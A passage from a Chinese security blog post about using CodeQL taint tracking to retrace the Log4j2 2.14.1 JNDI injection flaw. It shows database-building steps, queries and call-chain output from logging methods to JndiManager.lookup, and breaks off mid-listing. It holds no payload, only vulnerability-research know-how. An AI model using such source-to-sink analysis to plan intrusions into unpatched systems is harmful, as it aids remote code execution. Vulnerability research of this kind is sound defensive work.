<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>利用CodeQL分析Log4j漏洞 | 藏青&#39;s BLOG</title>

  
  <meta name="author" content="藏青">
  

  
  <meta name="description" content="知行合一">
  

  
  <meta name="keywords" content="渗透 内网 代码审计">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="利用CodeQL分析Log4j漏洞"/>

  <meta property="og:site_name" content="藏青&#39;s BLOG"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">藏青&#39;s BLOG</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/categories">Categories</a></li>
      
        <li><a href="/links">Links</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>利用CodeQL分析Log4j漏洞</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2021/12/22/利用CodeQL分析Log4j漏洞/" rel="bookmark">
        <time class="entry-date published" datetime="2021-12-22T06:26:58.000Z">
          2021-12-22
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        分析漏洞的本质是为了能让我们从中学习漏洞挖掘者的思路以及挖掘到新的漏洞，而CodeQL就是一款可以将我们对漏洞的理解快速转化为可实现的规则并挖掘漏洞的利器。根据网上的传言Log4j2的RCE漏洞就是作者通过CodeQL挖掘出的。虽然如何挖掘的我们不得而知，但我们现在站在事后的角度再去想想，可以推测一下作者如何通过CodeQL挖掘到漏洞的,并尝试基于作者的思路挖掘新漏洞。</p>
<span id="more"></span>

<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>​    首先我们要构建Log4j的数据库，由于<code>lgtm.com</code>中构建的是新版本的Log4j数据库，所以只能手动构建数据库了。首先从github获取源码并切换到2.14.1版本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/apache/logging-log4j2.git</span><br><span class="line">git checkout be881e5</span><br></pre></td></tr></table></figure>

<p>​    由于我们这次分析的主要是<code>log4j-core</code>和<code>log4j-api</code>中的内容，所以打开根目录的Pom.xml注释下面的内容。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">module</span>&gt;</span>log4j-api-java9<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">module</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">module</span>&gt;</span>log4j-core-java9<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">module</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;module&gt;log4j-layout-template-json&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-core-its&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-1.2-api&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-slf4j-impl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-slf4j18-impl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-to-slf4j&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jcl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-flume-ng&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-taglib&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jmx-gui&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-samples&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-bom&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jdbc-dbcp2&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jpa&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-couchdb&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-mongodb3&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-mongodb4&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-cassandra&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-web&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-perf&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-iostreams&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jul&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jpl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-liquibase&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-appserver&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-osgi&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-docker&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-kubernetes&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-spring-boot&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-spring-cloud-config&lt;/module&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    由于<code>log4j-api-java9</code>和<code>log4j-core-java9</code>需要依赖JDK9，所以要先下载JDK9并且在<code>C:\Users\用户名\.m2\toolchains.xml</code>中加上下面的内容。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">toolchains</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">toolchain</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">type</span>&gt;</span>jdk<span class="tag">&lt;/<span class="name">type</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">provides</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">vendor</span>&gt;</span>sun<span class="tag">&lt;/<span class="name">vendor</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">provides</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">jdkHome</span>&gt;</span>C:\Program Files\Java\jdk-9.0.4<span class="tag">&lt;/<span class="name">jdkHome</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">toolchain</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">toolchains</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    通过下面的命令完成数据库构建</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CodeQL database create Log4jDB --language=java --overwrite --command=&quot;mvn clean install -Dmaven.test.skip=true&quot;</span><br></pre></td></tr></table></figure>

<p>​    构建好数据库后，我们要找JNDI注入的漏洞，首先要确定在这套系统中调用了InitialContext#lookup方法。在<a target="_blank" rel="noopener" href="https://github.dev/SummerSec/LookupInterface">LookupInterface</a>项目中已经集成了常见的发起JNDI请求的类,只要稍微改一下即可。</p>
<p>​    首先定义Context类型，这个类中综合了可能发起JNDI请求的类。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Context</span> <span class="keyword">extends</span>  <span class="title">RefType</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">Context</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.hasQualifiedName(<span class="string">&quot;javax.naming&quot;</span>, <span class="string">&quot;Context&quot;</span>)</span><br><span class="line">        or</span><br><span class="line">        <span class="built_in">this</span>.hasQualifiedName(<span class="string">&quot;javax.naming&quot;</span>, <span class="string">&quot;InitialContext&quot;</span>)</span><br><span class="line"></span><br><span class="line">        or</span><br><span class="line">        <span class="built_in">this</span>.hasQualifiedName(<span class="string">&quot;org.springframework.jndi&quot;</span>, <span class="string">&quot;JndiCallback&quot;</span>)</span><br><span class="line">        or </span><br><span class="line">        <span class="built_in">this</span>.hasQualifiedName(<span class="string">&quot;org.springframework.jndi&quot;</span>, <span class="string">&quot;JndiTemplate&quot;</span>)</span><br><span class="line">        or</span><br><span class="line">        <span class="built_in">this</span>.hasQualifiedName(<span class="string">&quot;org.springframework.jndi&quot;</span>, <span class="string">&quot;JndiLocatorDelegate&quot;</span>)</span><br><span class="line">        or</span><br><span class="line">        <span class="built_in">this</span>.hasQualifiedName(<span class="string">&quot;org.apache.shiro.jndi&quot;</span>, <span class="string">&quot;JndiCallback&quot;</span>)</span><br><span class="line">        or</span><br><span class="line">        <span class="built_in">this</span>.getQualifiedName().matches(<span class="string">&quot;%JndiCallback&quot;</span>)</span><br><span class="line">        or</span><br><span class="line">        <span class="built_in">this</span>.getQualifiedName().matches(<span class="string">&quot;%JndiLocatorDelegate&quot;</span>)</span><br><span class="line">        or</span><br><span class="line">        <span class="built_in">this</span>.getQualifiedName().matches(<span class="string">&quot;%JndiTemplate&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    下面寻找那里调用了<code>Context</code>的lookup方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Call call,Callable parseExpression</span><br><span class="line">where</span><br><span class="line">    call.getCallee() = parseExpression and </span><br><span class="line">    parseExpression.getDeclaringType() <span class="keyword">instanceof</span> Context and</span><br><span class="line">    parseExpression.hasName(<span class="string">&quot;lookup&quot;</span>)</span><br><span class="line">select call</span><br></pre></td></tr></table></figure>

<p><img src="/2021/12/22/%E5%88%A9%E7%94%A8CodeQL%E5%88%86%E6%9E%90Log4j%E6%BC%8F%E6%B4%9E/image-20211223095651232.png" alt="image-20211223095651232"></p>
<ul>
<li><code>DataSourceConnectionSource#createConnectionSource</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PluginFactory</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> DataSourceConnectionSource <span class="title">createConnectionSource</span><span class="params">(<span class="meta">@PluginAttribute(&quot;jndiName&quot;)</span> <span class="keyword">final</span> String jndiName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Strings.isEmpty(jndiName)) &#123;</span><br><span class="line">        LOGGER.error(<span class="string">&quot;No JNDI name provided.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> InitialContext context = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        <span class="keyword">final</span> DataSource dataSource = (DataSource) context.lookup(jndiName);</span><br><span class="line">        <span class="keyword">if</span> (dataSource == <span class="keyword">null</span>) &#123;</span><br><span class="line">            LOGGER.error(<span class="string">&quot;No data source found with JNDI name [&quot;</span> + jndiName + <span class="string">&quot;].&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> DataSourceConnectionSource(jndiName, dataSource);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> NamingException e) &#123;</span><br><span class="line">        LOGGER.error(e.getMessage(), e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>JndiManager#lookup</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (T) <span class="keyword">this</span>.context.lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    找到sink后我们还需要找到source，虽然Codeql定义了<code>RemoteFlowSource</code>支持多种source，但是我们还是要根据实际的代码业务来分析可能作为source的点。</p>
<p>​    在Log4j作为日志记录的工具，除了从HTTP请求中获取输入点外，还可以在记录日志请求或者解析配置文件中来获取source。先不看解析配置文件获取source的点了，因为这需要分析Log4j解析配置文件的流程比较复杂。所以目前我们只考虑通过日志记录作为source的情况。稍微了解Log4j的同学都知道，Log4j会通过<code>error/fatal/info/debug/trace</code>等方法对不同级别的日志进行记录。通过分析我们可以看到我们输入的message都调用了<code>logIfEnabled</code>方法并作为第四个参数输入，所以可以将这里定义为source。</p>
<p><img src="/2021/12/22/%E5%88%A9%E7%94%A8CodeQL%E5%88%86%E6%9E%90Log4j%E6%BC%8F%E6%B4%9E/image-20211223152203536.png" alt="image-20211223152203536"></p>
<p>​    下面使用全局污点追踪分析JNDI漏洞，还是套用<a target="_blank" rel="noopener" href="https://github.dev/SummerSec/LookupInterface">LookupInterface</a>项目中的代码，修改source部分即可。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *<span class="doctag">@name </span>Tainttrack Context lookup</span></span><br><span class="line"><span class="comment"> *<span class="doctag">@kind <span class="variable">path</span></span>-problem</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Context</span> <span class="keyword">extends</span>  <span class="title">RefType</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">Context</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.hasQualifiedName(<span class="string">&quot;javax.naming&quot;</span>, <span class="string">&quot;Context&quot;</span>)</span><br><span class="line">        or</span><br><span class="line">        <span class="built_in">this</span>.hasQualifiedName(<span class="string">&quot;javax.naming&quot;</span>, <span class="string">&quot;InitialContext&quot;</span>)</span><br><span class="line"></span><br><span class="line">        or</span><br><span class="line">        <span class="built_in">this</span>.hasQualifiedName(<span class="string">&quot;org.springframework.jndi&quot;</span>, <span class="string">&quot;JndiCallback&quot;</span>)</span><br><span class="line">        or </span><br><span class="line">        <span class="built_in">this</span>.hasQualifiedName(<span class="string">&quot;org.springframework.jndi&quot;</span>, <span class="string">&quot;JndiTemplate&quot;</span>)</span><br><span class="line">        or</span><br><span class="line">        <span class="built_in">this</span>.hasQualifiedName(<span class="string">&quot;org.springframework.jndi&quot;</span>, <span class="string">&quot;JndiLocatorDelegate&quot;</span>)</span><br><span class="line">        or</span><br><span class="line">        <span class="built_in">this</span>.hasQualifiedName(<span class="string">&quot;org.apache.shiro.jndi&quot;</span>, <span class="string">&quot;JndiCallback&quot;</span>)</span><br><span class="line">        or</span><br><span class="line">        <span class="built_in">this</span>.getQualifiedName().matches(<span class="string">&quot;%JndiCallback&quot;</span>)</span><br><span class="line">        or</span><br><span class="line">        <span class="built_in">this</span>.getQualifiedName().matches(<span class="string">&quot;%JndiLocatorDelegate&quot;</span>)</span><br><span class="line">        or</span><br><span class="line">        <span class="built_in">this</span>.getQualifiedName().matches(<span class="string">&quot;%JndiTemplate&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> <span class="keyword">extends</span>  <span class="title">RefType</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">Logger</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.hasQualifiedName(<span class="string">&quot;org.apache.logging.log4j.spi&quot;</span>, <span class="string">&quot;AbstractLogger&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">predicate <span class="function"><span class="title">isLookup</span>(<span class="params">Expr arg</span>)</span> &#123;</span><br><span class="line">    exists(MethodAccess ma |</span><br><span class="line">        ma.getMethod().getName() = <span class="string">&quot;lookup&quot;</span></span><br><span class="line">        and</span><br><span class="line">        ma.getMethod().getDeclaringType() <span class="keyword">instanceof</span> Context</span><br><span class="line">        and</span><br><span class="line">        arg = ma.getArgument(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">predicate <span class="function"><span class="title">isLogging</span>(<span class="params">Expr arg</span>)</span> &#123;</span><br><span class="line">    exists(MethodAccess ma |</span><br><span class="line">        ma.getMethod().getName() = <span class="string">&quot;logIfEnabled&quot;</span></span><br><span class="line">        and</span><br><span class="line">        ma.getMethod().getDeclaringType() <span class="keyword">instanceof</span> Logger</span><br><span class="line">        and</span><br><span class="line">        arg = ma.getArgument(<span class="number">3</span>)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TainttrackLookup</span>  <span class="keyword">extends</span> <span class="title">TaintTracking</span>::<span class="title">Configuration</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">TainttrackLookup</span>(<span class="params"></span>)</span> &#123; </span><br><span class="line">        <span class="built_in">this</span> = <span class="string">&quot;TainttrackLookup&quot;</span> </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate <span class="function"><span class="title">isSource</span>(<span class="params">DataFlow::Node source</span>)</span> &#123;</span><br><span class="line">        exists(Expr exp |</span><br><span class="line">            isLogging(exp)</span><br><span class="line">            and</span><br><span class="line">            source.asExpr() = exp</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate <span class="function"><span class="title">isSink</span>(<span class="params">DataFlow::Node sink</span>)</span> &#123;</span><br><span class="line">        exists(Expr arg |</span><br><span class="line">            isLookup(arg)</span><br><span class="line">            and</span><br><span class="line">            sink.asExpr() = arg</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> TainttrackLookup config , <span class="attr">DataFlow</span>::PathNode source, <span class="attr">DataFlow</span>::PathNode sink</span><br><span class="line">where</span><br><span class="line">    config.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, <span class="string">&quot;unsafe lookup&quot;</span>, source.getNode(), <span class="string">&quot;this is user input&quot;</span></span><br></pre></td></tr></table></figure>

<p>​    虽然这些也得到了很多查询结果，但是在实际使用Log4j打印日志时可能不会带上Marker参数而是直接写入messge的内容。</p>
<p><img src="/2021/12/22/%E5%88%A9%E7%94%A8CodeQL%E5%88%86%E6%9E%90Log4j%E6%BC%8F%E6%B4%9E/image-20211223155405816.png" alt="image-20211223155405816"></p>
<p>​    所以我们现在要追踪的source应该是带有一个参数的<code>error/fatal/info/debug/trace</code>等方法。我这里以error方法为例对source部分进行修改。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoggerInput</span> <span class="keyword">extends</span>  <span class="title">Method</span> </span>&#123;</span><br><span class="line">    LoggerInput()&#123;</span><br><span class="line">        <span class="comment">//限定调用的类名、方法名、以及方法只有一个参数</span></span><br><span class="line">        <span class="keyword">this</span>.getDeclaringType() <span class="keyword">instanceof</span> Logger and</span><br><span class="line">        <span class="keyword">this</span>.hasName(<span class="string">&quot;error&quot;</span>) and <span class="keyword">this</span>.getNumberOfParameters() = <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将第一个参数作为source</span></span><br><span class="line">    <span class="function">Parameter <span class="title">getAnUntrustedParameter</span><span class="params">()</span> </span>&#123; result = <span class="keyword">this</span>.getParameter(<span class="number">0</span>) &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">override predicate <span class="title">isSource</span><span class="params">(DataFlow::Node source)</span> </span>&#123;</span><br><span class="line">        exists(LoggerInput LoggerMethod |</span><br><span class="line">            source.asParameter() = LoggerMethod.getAnUntrustedParameter())</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​    这样我们就得到了多条链,现在我们要写个Demo验证这个链是否可行，比如最简单的<code>logger.error(&quot;xxxxx&quot;);</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1	message : Message 	AbstractLogger.java:709:23</span><br><span class="line">2	message : Message 	AbstractLogger.java:710:47</span><br><span class="line">3	message : Message 	AbstractLogger.java:1833:89</span><br><span class="line">4	message : Message 	AbstractLogger.java:1835:38</span><br><span class="line">5	message : Message 	Logger.java:262:70</span><br><span class="line">6	message : Message 	Logger.java:263:52</span><br><span class="line">7	msg : Message 	Logger.java:617:64</span><br><span class="line">8	msg : Message 	Logger.java:620:78</span><br><span class="line">9	msg : Message 	RegexFilter.java:73:87</span><br><span class="line">10	msg : Message 	RegexFilter.java:78:63</span><br><span class="line">...</span><br><span class="line">64	convertJndiName(...) : String 	JndiLookup.java:54:33</span><br><span class="line">65	jndiName : String 	JndiLookup.java:56:56</span><br><span class="line">66	name : String 	JndiManager.java:171:25</span><br><span class="line">67	name 	JndiManager.java:172:40</span><br><span class="line">Path</span><br></pre></td></tr></table></figure>

<p>​    但是这条链只有配置了Filter为<code>RegexFilter</code>才会继续执行，而默认没有配置则为空。</p>
<p><img src="/2021/12/22/%E5%88%A9%E7%94%A8CodeQL%E5%88%86%E6%9E%90Log4j%E6%BC%8F%E6%B4%9E/image-20211223170850588.png" alt="image-20211223170850588"></p>
<p>​    所以这种方式就稍微有些限制，所以我们再去看看其他链。这条链似乎不用配置Filter。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1	message : Message 	AbstractLogger.java:709:23</span><br><span class="line">2	message : Message 	AbstractLogger.java:710:47</span><br><span class="line">3	message : Message 	AbstractLogger.java:1833:89</span><br><span class="line">4	message : Message 	AbstractLogger.java:1836:51</span><br><span class="line">5	message : Message 	AbstractLogger.java:2139:94</span><br><span class="line">6	message : Message 	AbstractLogger.java:2142:59</span><br><span class="line">7	message : Message 	AbstractLogger.java:2155:43</span><br><span class="line">8	message : Message 	AbstractLogger.java:2159:67</span><br><span class="line">9	message : 